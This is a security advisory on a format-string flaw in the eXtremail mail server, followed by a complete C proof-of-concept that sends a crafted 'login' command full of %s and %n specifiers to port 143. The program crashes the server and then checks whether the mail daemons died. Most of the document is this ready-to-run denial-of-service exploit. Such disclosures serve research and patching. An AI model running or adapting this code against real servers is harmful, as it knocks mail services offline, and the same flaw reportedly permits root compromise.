source: http://www.securityfocus.com/bid/2908/info

eXtremail is a freeware SMTP server available for Linux and AIX.

eXtremail contains a format-string vulnerability in its logging mechanism. Attackers can send SMTP commands argumented with maliciously constructed arguments that will exploit this vulnerability.

eXtremail runs with root privileges. By exploiting this vulnerability, remote attackers can gain superuser access on the underlying host and can crash eXtremail. If the system is not restarted automatically, a denial of SMTP service will result.

UPDATE (April 26, 2004): Reportedly, this vulnerability has been reintroduced into the new version (1.5.9) of eXtremail.

UPDATE (October 26, 2007): Reports indicate that the 'USER' command of eXtremail 2.1.1 and prior is still vulnerable. Symantec has not confirmed this. 

/**********************************************
*  Proof of Concept                           *
*  eXtremail 1.5.x Denial of Service          *
*                                             *
*  Luca Ercoli  <luca.e [at] seeweb.com>      *
*  Seeweb          http://www.seeweb.com      *
*                                             *
***********************************************/

#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 143
#define MAXRECVSIZE 100


int main(int argc, char *argv[]);
void crash(char *host,int TYPE);


int numbytes;



void crash(char *host,int TYPE)
{

 int sockfd;
 char buf[MAXRECVSIZE];
 struct hostent *he;
 struct sockaddr_in their_addr;
 char poc[]="1 login %s%s%s%s%s%s%s%s%s %s%s%s%s%s%s%s%s%n%n%n\n";


  if ((he=gethostbyname(host)) == NULL)
     {
      perror("gethostbyname");
      exit(1);
     }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
      perror("socket");
      exit(1);
     }

 their_addr.sin_family = AF_INET;
 their_addr.sin_port = htons(PORT);
 their_addr.sin_addr = *((struct in_addr *)he->h_addr);
 memset(&(their_addr.sin_zero), '\0', 8);

  if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
     {
      perror("connect");
      exit(1);
     }


  if ((numbytes=recv(sockfd, buf, MAXRECVSIZE-1, 0)) == -1)
     {
      perror("recv");
      exit(1);
     }

 buf[numbytes] = '\0';

  if (TYPE == 0)
     {
      printf("[+] Server -> %s",buf);
      sleep(1);
      printf("\n[!] Sending malicious packet...\n");

      send(sockfd,poc, strlen(poc), 0);
      sleep(1);
      printf ("\n[+] Sent!\n");
     }

 close(sockfd);

}



int main(int argc, char *argv[])
{

 printf("\n\n  eXtremail 1.5.x Denial of Service  \n");
 printf("by Luca Ercoli <luca.e [at] seeweb.com>\n\n\n\n");


  if (argc != 2)
   {
    fprintf(stderr,"\nUsage -> %s hostname\n\n",argv[0]);
    exit(1);
   }

 crash(argv[1],0);
 numbytes=0;
 printf ("\n[+] Checking server status ...\n");


 if(!fork()) crash(argv[1],1);
 sleep(5);
 if (numbytes == 0) printf ("\n[!] Smtpd/Pop3d/Imapd/Remt crashed!\n\n\n");

 return 0;


}